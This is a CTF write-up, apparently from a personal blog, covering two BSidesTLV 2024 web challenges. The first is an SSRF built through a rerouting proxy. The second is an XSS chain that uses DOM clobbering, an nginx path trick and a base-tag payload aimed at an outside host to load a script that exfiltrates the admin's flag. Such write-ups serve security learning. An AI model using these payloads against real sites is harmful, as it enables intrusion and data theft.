---
weight: 1
title: BSidesTLV CTF 2024 Web Writeups
date: 2024-06-29T16:54:32+03:00
draft: false
author: Jonathan Levy
authorLink: https://jonathann403.github.io
description: Solutions to my fav (and hardest) WEB challenges in BSidesTLV CTF 2024.
tags:
  - web
  - xss
  - ssrf
  - domclobber
lightgallery: true
toc:
  enable: true
lastmod: 2024-07-19T16:54:32+03:00
---
## Introduction

This CTF was particularly enjoyable, especially after participating in the "Flag Fortress 2" group and achieving 2nd place.

I am Jonathan Levy (joe/jonathan403) and I did these challenges with my friend and teammate Thomas (thomillion) great teamwork!!


## "Echoes In The Dark" (450 Pts)

This challenge was outstanding! The creator successfully implemented a vulnerability that he discover in the wild! and did an excellent job. Great challenge, thank you author Rotem Reiss & Shaked Klein Orbach who co-authored this challenge!


![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629123402.png?raw=true?raw=true)

I began by accessing the web application to explore its functionalities, As you can see, this app is supposed to be a "GitHub code repository scanner for hidden issues". We got the instructions there on how to use it, and it wants our `GitHub Enterprise Server URL` and the `Personal Access Token` I don't have a GitHub enterprises server, but the creator mentions in the challenge description that you don't really need `GitHub Enterprise Server URL`.

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629124214.png?raw=true)

instead of `GitHub Enterprise Server URL` I've tried to enter a webhook url, to see where the requests are going and what are they.
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629124408.png?raw=true)

I've clicked `Integrate Now` and got two requests to my webhook:

1. `/api/v3/rate_limit`
2. `/api/v3/user/repos?type=all`

after a look in GitHub api documentations we can see that these endpoints are for `GitHub Enterprise Server`, BUT we can remove the `/api/v3` from it and this endpoint will become a working `api.github.com` endpoint!

and for that we need a proxy between the GitHub API and the BSidesGit so that we can remove the `/api/v3` from the endpoint, and send it directly to `api.github.com`

lets deploy a flask server that will receive the requests from the BSidesGit change what needed, and forward them to GitHub API:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629125851.png?raw=true)

let's also run `ngrok http 4455` to get our proxy to be online.

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629130042.png?raw=true)

Now we need to create a token, so lets follow the tutorial at the challenge:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629130214.png?raw=true)

after generating a token, we can start Integration:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629130325.png?raw=true)

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629130625.png?raw=true)

Thats the request we are getting ^, and also, the names of my demo repositories are displayed at the site:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629130758.png?raw=true)

I've tried doing XSS (Maybe the site manager sees this and we need the cookie), I've tried prototype pollution, and many more payloads, and nothing was successful!

But then, I took a look at the packets that are being return to BSidesGit server, and I found something interesting:

first of all, I've added this line to see the response content:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629131129.png?raw=true)

I saw that the response from `/api/v3/repos/jonathanalt/cycle/commits/main` (`66ba310fc90bc5d05e0443b7f7ad0c11085beab3`) appears at the end of the next request that his server sends `/api/v3/repos/jonathanalt/cycle/git/trees/`(`66ba310fc90bc5d05e0443b7f7ad0c11085beab3`):
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629131658.png?raw=true)

From here, the way to achieving SSRF is straightforward! Because we are the proxy, we can redirect the BSidesGit server wherever we want. So let's add these lines to the code to redirect the server to our webhook:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629132105.png?raw=true)

let's Integrate...

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629132218.png?raw=true)

And BOOM, we have visible SSRF!

Now, let's try to redirect the server to its own private files using `file:///etc/passwd`... Oops, no response. This happens because in NodeJS, the `Axios` package, the `fetch()` function, and similar packages do not support the `file://` schema.

So, what else can we do? That was the question I asked myself for hours. What do you do in this situation where you have SSRF (internal access) and no idea what to do? FUZZING to find forbidden endpoints.

So, that's what I did:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629133112.png?raw=true)

and after some fuzzing I really found the `/metrics` endpoint with the status code of  403 which is awesome for our situation. Now I'll try to send a request through our SSRF:

AND we got the FLAG!!

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240629133524.png?raw=true)

GG

## "Safe Note Sharing" (600 Pts)

It's quite common to see these note apps challenges in CTF competitions, and the "Safe Note Sharing" chall made by Dor Konis and Amit Laish was a crazy well made one!

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628095645.png?raw=true)

I began by accessing the web application to explore its functionalities, And I saw that users could create notes, contact an administrator to check note URLs, and access the source code for further examination.
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628101222.png?raw=true)

It became apparent that the challenge involved XSS (Cross-Site Scripting).
Additionally, I observed the presence of a Content Security Policy (CSP) in the response headers:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628101401.png?raw=true)

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628101750.png?raw=true)
After analyzing it with the CSP Evaluator, we noticed that the base URL was absent, potentially indicating vulnerability to Base tag injection. This injection could alter the base URL for scripts, such as `./script.js` will become `evil.com/script.js`.

After downloading the source code, we can see that this app is a node app that can be deployed locally with docker, although such deployment was unnecessary for this challenge.
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628102437.png?raw=true)

In the `support.mjs` file, it was observed that when the `/api/support/sendURL` endpoint receives a POST request, a Chromium instance is launched to access the provided URL:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628103110.png?raw=true)
And there's a `/api/support/flag` endpoint that needs to be accessed via the staff browser:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628103349.png?raw=true)
So now, our goal is to get an XSS that will be executed in the note that the staff has opened.
lets try to send him a note with a simple `<script>alert(1)<script>`

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628103557.png?raw=true)

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628103618.png?raw=true)

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628103657.png?raw=true)
It's here, but It'll not be executed because of the CSP (script-src 'strict-dynamic') which allows loading scripts from any source if it has been whitelisted by a nonce or hash.

now lets examine the html more, because there is an interesting script there:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628104100.png?raw=true)
In this script, it verifies if the user's origin is `http://localhost`. If true, it proceeds to sanitize the input and insert it into the `displayElement` HTML. If sanitization fails, it loads the `./logger.js` script and logs the error.

so maybe we can preform a DOM Clobbering here to cause an error and then clobber the loggerScript to load our own script!

Step No.1 is get inside the if statement: `<a id=isDevelopment href=hi>`
with this payload we can give `isDeveploment` a value and actually get inside the if statement:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628105803.png?raw=true)

In step 2, our objective is to either bypass DOMPurify's sanitize function or disrupt the second line of the process. After extensive research, it became clear that the only viable approach to achieve this goal is to get `DOMPurify.sanitize()` to be an unknown function and object.

and we can achieve that by firstly look at how dompurify.js is being imported:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628110509.png?raw=true)
we can see that it is imported with `./dompurify.js` which is a bit weird to me... because when you want to import DOMPurify you import it with a url like: `https://cdn.jsdelivr.net/npm/dompurify@2.3.3/dist/purify.min.js`

There is another way to cause an error, which is to import `./dompurify.js` the wrong way, because now it imports it like: `https://bstlv24-safenotesharing.chals.io/dompurify.js`
but what if we manipulate the url so that It'll look the same, and get you to the same page, but the imports will not be loaded.
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628113046.png?raw=true)

After looking at that `nginx.conf` file, we can see a misconfiguration in how requests to the root `/` and `/api` paths are handled. Specifically, the use of `try_files $uri $uri/ =404;` for the root path `/` could expose files to unintended access, which potentially will become a URL manipulation attack.

so we can break the try by appending `/api/..%2f` to the URL and trick the server into fetching `./dompurify.js` from a different context, that will make the `DOMPurify.sanitize()` break because this is not exist.

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628115431.png?raw=true)
and yes, it is broken!

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628115829.png?raw=true)

Now we got into this place of the code that loads the `./logger.js` script and we need to find a way how can we get it to be our `evil.com/logger.js` script....
Ummmm.. that reminds me of something! Remember the results from the CSP Evaluator?
I'll remind you them:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628101750.png?raw=true)

we have the Base Tag Injection which can change the base url of the `logger.js` script.
so that means we can change it to whatever I want and run js on the client (aka XSS)!

lets make our final payload that will clobber isDevelopment and change the base url:

```/api/..%2F?note=<base id="isDevelopment" href="https://x55.is/">```

and YAY we got XSS:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628121006.png?raw=true)

no we need to make a script that our webhook will send that will fetch the `/api/support/flag` endpoint and send us the response from it:

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628121203.png?raw=true)

I made this function that will fetch the `/api/support/flag` endpoint and send us the response from it:

I've loaded the script at the webhook site, and placed the note url in the contact support page:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628122412.png?raw=true)

and we got the flag at the webhook!!!!!

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/BSidesTLV2024/Pasted%20image%2020240628122447.png?raw=true)

That was a very great web challenge :)